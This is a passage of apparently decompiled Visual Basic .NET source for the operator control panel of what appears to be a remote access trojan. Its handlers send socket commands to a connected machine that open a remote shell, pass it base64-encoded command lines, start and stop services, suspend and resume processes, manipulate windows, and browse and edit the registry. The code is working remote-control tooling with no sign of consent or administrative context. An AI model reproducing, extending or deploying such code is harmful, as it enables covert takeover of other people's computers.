                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        If (Me.SM.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
            Try
                enumerator = Me.SM.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Restart" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(2).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub ResumeProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumeProcessToolStripMenuItem.Click
        If (Me.Processlists.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel4.Text = "Please wait a moment ..."
            Try
                enumerator = Me.Processlists.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Reusme" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub RF_Click(sender As Object, e As EventArgs) Handles RF.Click
        Me.ImageList1.Images.Clear()
        Me.PIIT.Items.Clear()
        Me.PIIT.Enabled = False
        My.Forms.Main.s.Send(Me.sock, ("GPI" & My.Forms.Main.Key))
        Me.ToolStripStatusLabel9.Text = "Please wait a moment ..."
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        If (Me.AW.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
            Try
                enumerator = Me.AW.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Show" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub SM_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles SM.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Private Sub SMB_ToggleChanged(sender As Object, e As EventArgs) Handles SMB.ToggleChanged
        If Me.SMB.Toggle Then
            My.Forms.Main.s.Send(Me.sock, "RSM")
        Else
            Me.RamGraph1.Enabled = False
            Me.Label1.Enabled = False
            Me.Panel8.Enabled = False
            Me.Label1.Text = "Memory"
            Me.Label8.Text = "N/A"
            Me.Label8.Text = "N/A"
            Me.Label2.Text = "N/A"
            Me.Label12.Text = "N/A"
            Me.Label11.Text = "N/A"
            Me.Label5.Text = "N/A"
            Me.Label7.Text = "N/A"
            Me.Label18.Text = "N/A"
            Me.Label21.Text = "N/A"
            Me.Label15.Text = "N/A"
            Me.Label19.Text = "N/A"
            Me.Label34.Text = "N/A"
            Me.Label37.Text = "N/A"
            Me.Label31.Text = "N/A"
            Me.Label35.Text = "N/A"
        End If
    End Sub

    Private Sub StartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem1.Click
        If (Me.StartToolStripMenuItem1.Text = "Start") Then
            Me.StartToolStripMenuItem1.Image = My.Resources._1477596924_Stop
            Me.StartToolStripMenuItem1.Text = "Stop"
            My.Forms.Main.s.Send(Me.sock, ("OpenRemoteShell" & My.Forms.Main.Key))
            Me.ResultCMD.Text = Nothing
        Else
            Me.StartToolStripMenuItem1.Text = "Start"
            Me.StartToolStripMenuItem1.Image = My.Resources._1477596916_resultset_next
            Dim s As String = "exit"
            My.Forms.Main.s.Send(Me.sock, ("WirteLines" & My.Forms.Main.Key & System_Manager.ENB(s)))
            Me.ResultCMD.Text = Nothing
        End If
    End Sub

    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
        If (Me.SM.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
            Try
                enumerator = Me.SM.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Start" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(2).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        If (Me.SM.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
            Try
                enumerator = Me.SM.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Stop" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(2).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub StringToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StringToolStripMenuItem.Click
        Me.C(1, True)
    End Sub

    Private Sub SuspendProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendProcessToolStripMenuItem.Click
        If (Me.Processlists.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel4.Text = "Please wait a moment ..."
            Try
                enumerator = Me.Processlists.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Suspended" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub System_Manager_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try
            Dim s As String = "exit"
            My.Forms.Main.s.Send(Me.sock, ("WirteLines" & My.Forms.Main.Key & System_Manager.ENB(s)))
            My.Forms.Main.s.Send(Me.sock, "Abort")
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub System_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim num5 As Integer
        Me.Images.Images.Add("1", My.Resources.rsz_1476116434_bullet_green)
        Me.Images.Images.Add("2", My.Resources.rsz_1476116499_bullet_red)
        Me.Images.Images.Add("3", My.Resources.rsz_thumb_14378800210shortcut_arrow)
        Me.Images.Images.Add("4", My.Resources._1476121459_application)
        Me.Images.Images.Add("5", My.Resources.window_app_blank_icon)
        Me.Images.Images.Add("6", My.Resources.rsz_1476172385_bullet_white)
        Me.Images.Images.Add("7", My.Resources.rsz_1476172388_bullet_orange)
        Dim speed As Integer = Me.TabControl1.Speed
        Me.TabControl1.Speed = 20
        Dim count As Integer = Me.TabControl1.TabPages.Count
        Dim i As Integer = 0
        Do While (i <= count)
            Me.TabControl1.SelectedIndex = i
            i += 1
        Loop
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Speed = speed
        Me.ToolStripStatusLabel5.Font = New Font("Verdana", 8.0!, FontStyle.Regular)
        Me.Processlists.GridLines = My.Forms.Main.Listview1.GridLines
        Me.AW.GridLines = My.Forms.Main.Listview1.GridLines
        Me.SM.GridLines = My.Forms.Main.Listview1.GridLines
        Me.KeysName.GridLines = My.Forms.Main.Listview1.GridLines
        Me.ValuesRegName.GridLines = My.Forms.Main.Listview1.GridLines
        Me.TCPC.GridLines = My.Forms.Main.Listview1.GridLines
        Me.PIIT.GridLines = My.Forms.Main.Listview1.GridLines
        Dim num3 As Integer = 0
        Do
            Me.UltimatumTabControl1.TabPages.Item(num3).BackColor = SystemColors.Window
            num3 += 1
            num5 = 6
        Loop While (num3 <= num5)
    End Sub

    Private Sub TCPC_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles TCPC.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function


    Public Function C(ByVal I As Integer, ByVal CR As Boolean) As Object
        Dim obj2 As Object
        Dim rve As New Rve
        rve.Sock = Me.sock
        rve.P = Me.RegPath.Text
        If CR Then
            rve.Create.Text = "Create"
            rve.Text = (Me.RegPath.Text & " Create a new value!")
            rve.CG = Conversions.ToString(SocketServer.Encode("Cre"))
            rve.D = True
        Else
            rve.Text = (Me.RegPath.Text & " Edit a value!")
            rve.Create.Text = "Save"
            rve.ValueData.Text = Me.ValuesRegName.FocusedItem.SubItems.Item(2).Text
            rve.VName.Text = Me.ValuesRegName.FocusedItem.SubItems.Item(0).Text
            rve.VName.Enabled = False
            rve.CG = Conversions.ToString(SocketServer.Encode("Edi"))
            rve.D = False
        End If
        rve.V = I
        rve.Name = Me.Name
        rve.ShowDialog()
        Return obj2
    End Function
    Private Function ReReg(ByVal C As Boolean) As Object
        Dim obj2 As Object
        Try
            Dim input As String = String.Empty
            If C Then
                input = Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "")
            Else
                input = (Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "") & Me.KeysName.FocusedItem.SubItems.Item(0).Text & "\")
                Me.RegPath.Text = (Me.RegPath.Text & Me.KeysName.FocusedItem.SubItems.Item(0).Text & "\")
            End If
            Me.KeysName.Items.Clear()
            Me.ValuesRegName.Items.Clear()

            If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.RegPath.Text, Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\"), False))) Then
                Me.KeysName.Items.Add("...", 0)
            End If
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Enter To Sub Key" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem))), My.Forms.Main.Key), SocketServer.Encode(input))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
        Return obj2
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Me.SMB.Toggle Then
            My.Forms.Main.s.Send(Me.sock, "RSM")
        End If
        If Me.GCPU.Toggle Then
            My.Forms.Main.s.Send(Me.sock, "RCPU")
        End If
        If Me.GSUS.Toggle Then
            My.Forms.Main.s.Send(Me.sock, "SDUN")
        End If
    End Sub

    Private Sub UnlockXButtonToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnlockXButtonToolStripMenuItem.Click
        If (Me.AW.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
            Try
                enumerator = Me.AW.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Unlock" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub ValuesRegName_DoubleClick(sender As Object, e As EventArgs) Handles ValuesRegName.DoubleClick
        Dim num As Integer
        If (Me.ValuesRegName.FocusedItem.SubItems.Item(1).Text = "String") Then
            num = 1
        ElseIf (Me.ValuesRegName.FocusedItem.SubItems.Item(1).Text = "Expand String") Then
            num = 2
        ElseIf (Me.ValuesRegName.FocusedItem.SubItems.Item(1).Text = "Binary") Then
            num = 3
        ElseIf (Me.ValuesRegName.FocusedItem.SubItems.Item(1).Text = "DWord") Then
            num = 4
        ElseIf (Me.ValuesRegName.FocusedItem.SubItems.Item(1).Text = "Multi-String") Then
            num = 7
        ElseIf (Me.ValuesRegName.FocusedItem.SubItems.Item(1).Text = "QWord") Then
            num = 11
        End If
        Me.C(num, False)
    End Sub
End Class